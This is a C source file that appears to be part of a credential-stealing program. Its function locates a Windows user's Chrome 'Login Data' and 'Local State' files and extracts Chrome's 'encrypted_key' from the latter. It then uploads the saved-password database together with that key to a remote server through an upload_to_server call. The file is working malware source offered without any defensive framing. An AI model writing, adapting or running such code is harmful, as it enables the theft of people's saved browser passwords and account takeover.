#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "../include/http.h"
#include "../include/structures.h"
#include "../include/uid.h"

int send_chrome_data_files(COMPUTER_INFOS *cmp_info)
{
    char chrome_data_login_path[512];
    snprintf(chrome_data_login_path, sizeof(chrome_data_login_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", cmp_info->username);

    char chrome_encrypted_data_path[512];
    snprintf(chrome_encrypted_data_path, sizeof(chrome_encrypted_data_path), "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", cmp_info->username);

    FILE *file = fopen(chrome_encrypted_data_path, "r");
    if (file == NULL)
    {
        perror("Failed to open file");
        return 1;
    }

    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *file_content = malloc(file_size + 1);
    if (file_content == NULL)
    {
        perror("Failed to allocate memory");
        fclose(file);
        return 1;
    }

    fread(file_content, 1, file_size, file);
    file_content[file_size] = '\0';
    fclose(file);

    const char *key = "\"encrypted_key\":\"";
    char *start = strstr(file_content, key);
    if (start != NULL)
    {
        start += strlen(key);
        char *end = strchr(start, '"');
        if (end != NULL)
        {
            size_t key_length = end - start;
            char *encrypted_key = malloc(key_length + 1);
            if (encrypted_key != NULL)
            {
                strncpy(encrypted_key, start, key_length);
                encrypted_key[key_length] = '\0';

                upload_to_server(chrome_data_login_path, "chromedata", encrypted_key);

                printf("Encrypted Key: %s\n", encrypted_key);
                free(encrypted_key);
            }
        }
    }

    free(file_content);
    return 0;
}